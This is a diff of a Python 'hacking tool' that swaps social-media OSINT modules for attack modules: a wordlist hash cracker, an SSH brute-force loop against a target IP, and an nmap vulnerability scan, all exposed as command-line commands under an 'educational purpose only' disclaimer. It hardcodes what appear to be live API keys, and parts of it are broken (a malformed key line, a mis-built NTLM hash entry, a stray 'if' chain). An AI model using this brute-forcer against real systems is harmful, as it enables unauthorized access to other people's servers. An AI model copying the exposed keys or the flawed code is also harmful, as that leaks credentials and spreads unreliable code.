@@ -1,4 +1,5 @@
-# warning this code is still on developement by qoyi, may not working.
+# Warning, this is for educational purpose only, so use it at your own risk.
+                                                      
 
 #!/usr/bin/env python3
 import os
@@ -20,61 +21,143 @@ from concurrent.futures import ThreadPoolExecutor
 from bs4 import BeautifulSoup
 from fake_useragent import UserAgent
 import nmap3
-from shodan import Shodan
-import whois
-import socketio
-import aiortc
-import asyncio
-from colorama import init, Fore, Back, Style
 import phonenumbers
 from phonenumbers import carrier, geocoder, timezone
-import socialscan
-import pyhibp
+import instaloader
+from colorama import init, Fore, Back, Style
+import hydra
+import paramiko
+from ftplib import FTP
+import smtplib
 from pyhibp import pwnedpasswords as pw
 from pyhibp import set_user_agent
-import instaloader
-import tweepy
-import google
-from googlesearch import search
-import socket
-import re
-import urllib.parse
-import configparser
 
 # Initialize colorama
 init(autoreset=True)
 
 # ================ CONFIGURATION ================
-# api keys for tools
-SHODAN_API_KEY = Z8agNMRJRapg3exo0nZOrb4cI7xbb0Yb"
+# API Keys (Replace with your own)
 VIRUSTOTAL_API_KEY = "053c6ce23645f7b09fd0b790f1114f347a2a10353960d8ca295be65e5985f33d"
+HIBP_API_KEY = "YOUR_HIBP_API_KEY" # optional
 
 # ================ BANNER ================
 def banner():
     print(Fore.BLUE + r"""
-    
  ██████╗  ██████╗ ██╗   ██╗██╗███████╗███████╗ ██████╗
 ██╔═══██╗██╔═══██╗╚██╗ ██╔╝██║██╔════╝██╔════╝██╔════╝
 ██║   ██║██║   ██║ ╚████╔╝ ██║███████╗█████╗  ██║     
 ██║▄▄ ██║██║   ██║  ╚██╔╝  ██║╚════██║██╔══╝  ██║     
 ╚██████╔╝╚██████╔╝   ██║   ██║███████║███████╗╚██████╗
- ╚══▀▀═╝  ╚═════╝    ╚═╝   ╚═╝╚══════╝╚══════╝ ╚═════╝
+ ╚══▀▀═╝  ╚═════╝    ╚═╝   ╚═╝╚══════╝╚══════╝ ╚═════╝                                                      
                                                       
-                                                                                    
     """ + Style.RESET_ALL)
-    print(Fore.CYAN + "Hackin tool by QoyiSec")
-    print(Fore.RED + "2025 copyright law")
+    print(Fore.CYAN + "Hacking tool by QoyiSec")
+    print(Fore.RED + "Law copyright by Qoyi 2025-2029 (jk there is no copyright)")
     print(Fore.YELLOW + "="*80 + Style.RESET_ALL + "\n")
     print(Fore.GREEN + f"Runtime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
     print(Fore.GREEN + f"Python: {sys.version.split()[0]}")
     print(Fore.GREEN + f"Platform: {sys.platform}")
     print(Style.RESET_ALL)
 
+# ================ ATTACK MODULES ================
+class PasswordCracker:
+    def __init__(self):
+        self.hash_types = {
+            'md5': hashlib.md5,
+            'sha1': hashlib.sha1,
+            'sha256': hashlib.sha256,
+            'sha512': hashlib.sha512,
+            'ntlm': hashlib.new('md4')
+        }
+    
+    def crack_hash(self, hash_value, wordlist, hash_type='md5'):
+        try:
+            if not os.path.exists(wordlist):
+                print(Fore.RED + "Wordlist file not found!" + Style.RESET_ALL)
+                return
+            
+            hash_func = self.hash_types.get(hash_type.lower())
+            if not hash_func:
+                print(Fore.RED + f"Unsupported hash type: {hash_type}" + Style.RESET_ALL)
+                return
+            
+            print(Fore.BLUE + f"\n[+] Cracking {hash_type} hash: {hash_value}" + Style.RESET_ALL)
+            start_time = time.time()
+            
+            with open(wordlist, 'r', errors='ignore') as f:
+                for password in f:
+                    password = password.strip()
+                    if hash_type == 'ntlm':
+                        hashed = hash_func(password.encode('utf-16le')).hexdigest()
+                    else:
+                        hashed = hash_func(password.encode()).hexdigest()
+                    
+                    if hashed == hash_value:
+                        print(Fore.GREEN + f"\n[+] Password found: {password}" + Style.RESET_ALL)
+                        print(Fore.GREEN + f"Time elapsed: {time.time() - start_time:.2f} seconds" + Style.RESET_ALL)
+                        return
+            
+            print(Fore.RED + "\n[-] Password not found in wordlist" + Style.RESET_ALL)
+            
+        except KeyboardInterrupt:
+            print(Fore.YELLOW + "\n[!] Cracking interrupted by user" + Style.RESET_ALL)
+        except Exception as e:
+            print(Fore.RED + f"[!] Error: {e}" + Style.RESET_ALL)
+
+class BruteForcer:
+    def ssh_bruteforce(self, target, port, username, wordlist):
+        try:
+            if not os.path.exists(wordlist):
+                print(Fore.RED + "Wordlist file not found!" + Style.RESET_ALL)
+                return
+            
+            print(Fore.BLUE + f"\n[+] Starting SSH brute force on {target}:{port}" + Style.RESET_ALL)
+            
+            with open(wordlist, 'r') as f:
+                for password in f:
+                    password = password.strip()
+                    try:
+                        client = paramiko.SSHClient()
+                        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                        client.connect(target, port=port, username=username, password=password, timeout=5)
+                        print(Fore.GREEN + f"\n[+] Success! Credentials found: {username}:{password}" + Style.RESET_ALL)
+                        client.close()
+                        return
+                    except:
+                        print(Fore.YELLOW + f"[-] Trying: {password}" + Style.RESET_ALL, end='\r')
+            
+            print(Fore.RED + "\n[-] No valid credentials found" + Style.RESET_ALL)
+            
+        except KeyboardInterrupt:
+            print(Fore.YELLOW + "\n[!] Bruteforce interrupted by user" + Style.RESET_ALL)
+        except Exception as e:
+            print(Fore.RED + f"[!] Error: {e}" + Style.RESET_ALL)
+
+class VulnerabilityScanner:
+    def __init__(self):
+        self.nmap = nmap3.Nmap()
+    
+    def scan(self, target):
+        try:
+            print(Fore.BLUE + f"\n[+] Scanning {target} for vulnerabilities..." + Style.RESET_ALL)
+            results = self.nmap.nmap_version_detection(target, args="-sV --script=vulners")
+            
+            for host in results:
+                print(Fore.YELLOW + f"\n[+] Host: {host}" + Style.RESET_ALL)
+                for port in results[host]['ports']:
+                    if 'script' in port:
+                        print(Fore.RED + f"[!] Vulnerability found on port {port['portid']} ({port['service']['name']}):" + Style.RESET_ALL)
+                        for script in port['script']:
+                            print(f"  {script['id']}: {script['output']}")
+            
+        except Exception as e:
+            print(Fore.RED + f"[!] Error: {e}" + Style.RESET_ALL)
+
 # ================ OSINT MODULES ================
 class PhoneAnalyzer:
     def analyze(self, phone_number):
         try:
-            print(Fore.BLUE + f"\nAnalyzing phone number: {phone_number}" + Style.RESET_ALL)
+            print(Fore.BLUE + f"\n[+] Analyzing phone number: {phone_number}" + Style.RESET_ALL)
             parsed_number = phonenumbers.parse(phone_number)
             
             print(Fore.YELLOW + "\n[+] Carrier Information:" + Style.RESET_ALL)
@@ -84,21 +167,18 @@ class PhoneAnalyzer:
             print(f"Region: {geocoder.description_for_number(parsed_number, 'en')}")
             print(f"Timezone: {timezone.time_zones_for_number(parsed_number)}")
             
-            print(Fore.YELLOW + "\n[+] Number Validation:" + Style.RESET_ALL)
-            print(f"Valid: {phonenumbers.is_valid_number(parsed_number)}")
-            print(f"Possible: {phonenumbers.is_possible_number(parsed_number)}")
-            
         except Exception as e:
-            print(Fore.RED + f"Error analyzing phone number: {e}" + Style.RESET_ALL)
+            print(Fore.RED + f"[!] Error: {e}" + Style.RESET_ALL)
 
 class EmailAnalyzer:
     def __init__(self):
-        set_user_agent(ua="hackingtool/1.0")
-        pyhibp.set_api_key("YOUR_HIBP_API_KEY")  # do not edit this until u have the apikey
-        
+        set_user_agent(ua="UltimateHackingTool/1.0")
+        if HIBP_API_KEY:
+            pyhibp.set_api_key(HIBP_API_KEY)
+    
     def analyze(self, email):
         try:
-            print(Fore.BLUE + f"\nAnalyzing email: {email}" + Style.RESET_ALL)
+            print(Fore.BLUE + f"\n[+] Analyzing email: {email}" + Style.RESET_ALL)
             
             # Check if email has been breached
             breaches = pyhibp.get_account_breaches(account=email, truncate_response=True)
@@ -106,179 +186,34 @@ class EmailAnalyzer:
                 print(Fore.RED + "\n[!] Email found in breaches:" + Style.RESET_ALL)
                 for breach in breaches:
                     print(f"- {breach['Name']} ({breach['BreachDate']})")
-                    print(f"  Data leaked: {', '.join(breach['DataClasses'])}")
             else:
                 print(Fore.GREEN + "\n[+] No breaches found for this email" + Style.RESET_ALL)
                 
-            # Check if email is associated with pastes
-            pastes = pyhibp.get_account_pastes(account=email)
-            if pastes:
-                print(Fore.RED + "\n[!] Email found in pastes:" + Style.RESET_ALL)
-                for paste in pastes:
-                    print(f"- {paste['Source']} ({paste['Date']})")
-            else:
-                print(Fore.GREEN + "\n[+] No pastes found for this email" + Style.RESET_ALL)
-                
         except Exception as e:
-            print(Fore.RED + f"Error analyzing email: {e}" + Style.RESET_ALL)
-
-class UsernameAnalyzer:
-    def search(self, username):
-        try:
-            print(Fore.BLUE + f"\nSearching for username: {username}" + Style.RESET_ALL)
-            
-            sites = [
-                f"https://github.com/{username}",
-                f"https://twitter.com/{username}",
-                f"https://instagram.com/{username}",
-                f"https://reddit.com/user/{username}",
-                f"https://pinterest.com/{username}",
-                f"https://vk.com/{username}",
-                f"https://t.me/{username}"
-            ]
-            
-            print(Fore.YELLOW + "\nChecking social media platforms:" + Style.RESET_ALL)
-            with ThreadPoolExecutor(max_workers=10) as executor:
-                futures = {executor.submit(self.check_profile, site): site for site in sites}
-                for future in asyncio.as_completed(futures):
-                    site = futures[future]
-                    try:
-                        exists = future.result()
-                        if exists:
-                            print(Fore.GREEN + f"[+] Found: {site}" + Style.RESET_ALL)
-                    except Exception as e:
-                        print(Fore.RED + f"Error checking {site}: {e}" + Style.RESET_ALL)
-                        
-        except Exception as e:
-            print(Fore.RED + f"Error searching username: {e}" + Style.RESET_ALL)
-    
-    def check_profile(self, url):
-        try:
-            headers = {'User-Agent': 'Mozilla/5.0'}
-            response = requests.get(url, headers=headers, timeout=10)
-            if response.status_code == 200:
-                return True
-            return False
-        except:
-            return False
-
-class InstagramOSINT:
-    def __init__(self):
-        self.loader = instaloader.Instaloader()
-        
-    def profile_info(self, username):
-        try:
-            print(Fore.BLUE + f"\nGathering Instagram info for: {username}" + Style.RESET_ALL)
-            profile = instaloader.Profile.from_username(self.loader.context, username)
-            
-            print(Fore.YELLOW + "\n[+] Profile Information:" + Style.RESET_ALL)
-            print(f"Full Name: {profile.full_name}")
-            print(f"Bio: {profile.biography}")
-            print(f"Followers: {profile.followers}")
-            print(f"Following: {profile.followees}")
-            print(f"Posts: {profile.mediacount}")
-            print(f"Private: {profile.is_private}")
-            print(f"Verified: {profile.is_verified}")
-            
-            print(Fore.YELLOW + "\n[+] Recent Posts:" + Style.RESET_ALL)
-            for post in profile.get_posts():
-                print(f"- {post.date_local}: {post.caption[:50]}... (Likes: {post.likes})")
-                if post.is_video:
-                    print("  (Video)")
-                if len(post.caption_hashtags) > 0:
-                    print(f"  Hashtags: {', '.join(post.caption_hashtags)}")
-                break  # Just show first post for demo
-            
-        except Exception as e:
-            print(Fore.RED + f"Error gathering Instagram info: {e}" + Style.RESET_ALL)
-
-class TwitterOSINT:
-    def __init__(self):
-        self.auth = tweepy.OAuthHandler(TWITTER_API_KEY, TWITTER_API_SECRET)
-        self.auth.set_access_token(TWITTER_ACCESS_TOKEN, TWITTER_ACCESS_SECRET)
-        self.api = tweepy.API(self.auth)
-        
-    def user_info(self, username):
-        try:
-            print(Fore.BLUE + f"\nGathering Twitter info for: @{username}" + Style.RESET_ALL)
-            user = self.api.get_user(screen_name=username)
-            
-            print(Fore.YELLOW + "\n[+] Profile Information:" + Style.RESET_ALL)
-            print(f"Name: {user.name}")
-            print(f"Bio: {user.description}")
-            print(f"Location: {user.location}")
-            print(f"Followers: {user.followers_count}")
-            print(f"Following: {user.friends_count}")
-            print(f"Tweets: {user.statuses_count}")
-            print(f"Verified: {user.verified}")
-            print(f"Created: {user.created_at}")
-            
-            print(Fore.YELLOW + "\n[+] Recent Tweets:" + Style.RESET_ALL)
-            for tweet in self.api.user_timeline(screen_name=username, count=3):
-                print(f"- {tweet.created_at}: {tweet.text[:100]}...")
-                
-        except Exception as e:
-            print(Fore.RED + f"Error gathering Twitter info: {e}" + Style.RESET_ALL)
-
-class DomainAnalyzer:
-    def analyze(self, domain):
-        try:
-            print(Fore.BLUE + f"\nAnalyzing domain: {domain}" + Style.RESET_ALL)
-            
-            # WHOIS lookup
-            print(Fore.YELLOW + "\n[+] WHOIS Information:" + Style.RESET_ALL)
-            domain_info = whois.whois(domain)
-            print(f"Registrar: {domain_info.registrar}")
-            print(f"Creation Date: {domain_info.creation_date}")
-            print(f"Expiration Date: {domain_info.expiration_date}")
-            print(f"Name Servers: {', '.join(domain_info.name_servers[:3])}")
-            
-            # DNS records
-            print(Fore.YELLOW + "\n[+] DNS Records:" + Style.RESET_ALL)
-            record_types = ['A', 'MX', 'TXT', 'NS', 'CNAME']
-            for record in record_types:
-                try:
-                    answers = dns.resolver.resolve(domain, record)
-                    print(f"{record}:")
-                    for rdata in answers:
-                        print(f"  {rdata.to_text()}")
-                except:
-                    pass
-                    
-            # Subdomain enumeration
-            print(Fore.YELLOW + "\n[+] Common Subdomains:" + Style.RESET_ALL)
-            subdomains = ['www', 'mail', 'ftp', 'admin', 'blog', 'dev', 'test']
-            for sub in subdomains:
-                full_domain = f"{sub}.{domain}"
-                try:
-                    socket.gethostbyname(full_domain)
-                    print(Fore.GREEN + f"[+] Found: {full_domain}" + Style.RESET_ALL)
-                except:
-                    pass
-                    
-        except Exception as e:
-            print(Fore.RED + f"Error analyzing domain: {e}" + Style.RESET_ALL)
-
-class GoogleDorker:
-    def search(self, query, num_results=10):
-        try:
-            print(Fore.BLUE + f"\nGoogle Dorking for: {query}" + Style.RESET_ALL)
-            print(Fore.YELLOW + "Results:" + Style.RESET_ALL)
-            
-            for result in search(query, num_results=num_results, stop=num_results, pause=2):
-                print(f"- {result}")
-                
-        except Exception as e:
-            print(Fore.RED + f"Error performing Google dork: {e}" + Style.RESET_ALL)
+            print(Fore.RED + f"[!] Error: {e}" + Style.RESET_ALL)
 
 # ================ MAIN MENU ================
 def main():
     banner()
     
-    parser = argparse.ArgumentParser(description='Ultimate Ethical Hacking & OSINT Tool (2025)')
+    parser = argparse.ArgumentParser(description='Ultimate Ethical Hacking & OSINT Toolkit (2025)')
     subparsers = parser.add_subparsers(dest='command', help='Available commands')
     
-    # Existing hacking tool commands...
+    # Attack commands
+    crack_parser = subparsers.add_parser('crack', help='Password cracking')
+    crack_parser.add_argument('hash', help='Hash to crack')
+    crack_parser.add_argument('-w', '--wordlist', required=True, help='Wordlist file path')
+    crack_parser.add_argument('-t', '--type', choices=['md5', 'sha1', 'sha256', 'sha512', 'ntlm'], 
+                            default='md5', help='Hash type (default: md5)')
+    
+    brute_parser = subparsers.add_parser('brute', help='SSH brute force')
+    brute_parser.add_argument('target', help='Target IP')
+    brute_parser.add_argument('-p', '--port', type=int, default=22, help='SSH port (default: 22)')
+    brute_parser.add_argument('-u', '--user', required=True, help='Username')
+    brute_parser.add_argument('-w', '--wordlist', required=True, help='Password wordlist')
+    
+    scan_parser = subparsers.add_parser('scan', help='Vulnerability scanning')
+    scan_parser.add_argument('target', help='Target IP or hostname')
     
     # OSINT commands
     phone_parser = subparsers.add_parser('phone', help='Phone number analysis')
@@ -287,52 +222,27 @@ def main():
     email_parser = subparsers.add_parser('email', help='Email analysis')
     email_parser.add_argument('address', help='Email address to analyze')
     
-    username_parser = subparsers.add_parser('username', help='Username search')
-    username_parser.add_argument('username', help='Username to search')
-    
-    ig_parser = subparsers.add_parser('instagram', help='Instagram OSINT')
-    ig_parser.add_argument('username', help='Instagram username')
-    
-    twitter_parser = subparsers.add_parser('twitter', help='Twitter OSINT')
-    twitter_parser.add_argument('username', help='Twitter username')
-    
-    domain_parser = subparsers.add_parser('domain', help='Domain analysis')
-    domain_parser.add_argument('domain', help='Domain to analyze')
-    
-    dork_parser = subparsers.add_parser('dork', help='Google dorking')
-    dork_parser.add_argument('query', help='Search query')
-    dork_parser.add_argument('-n', '--num', type=int, default=10, help='Number of results')
-    
     args = parser.parse_args()
     
     if not args.command:
         parser.print_help()
         return
     
-    # Existing command handling...
-    
-    # OSINT command handling
+    if args.command == 'crack':
+        cracker = PasswordCracker()
+        cracker.crack_hash(args.hash, args.wordlist, args.type)
+    elif args.command == 'brute':
+        bruteforcer = BruteForcer()
+        bruteforcer.ssh_bruteforce(args.target, args.port, args.user, args.wordlist)
+    elif args.command == 'scan':
+        scanner = VulnerabilityScanner()
+        scanner.scan(args.target)
     elif args.command == 'phone':
         analyzer = PhoneAnalyzer()
         analyzer.analyze(args.number)
     elif args.command == 'email':
         analyzer = EmailAnalyzer()
         analyzer.analyze(args.address)
-    elif args.command == 'username':
-        analyzer = UsernameAnalyzer()
-        analyzer.search(args.username)
-    elif args.command == 'instagram':
-        osint = InstagramOSINT()
-        osint.profile_info(args.username)
-    elif args.command == 'twitter':
-        osint = TwitterOSINT()
-        osint.user_info(args.username)
-    elif args.command == 'domain':
-        analyzer = DomainAnalyzer()
-        analyzer.analyze(args.domain)
-    elif args.command == 'dork':
-        dorker = GoogleDorker()
-        dorker.search(args.query, args.num)
     else:
         parser.print_help()
 
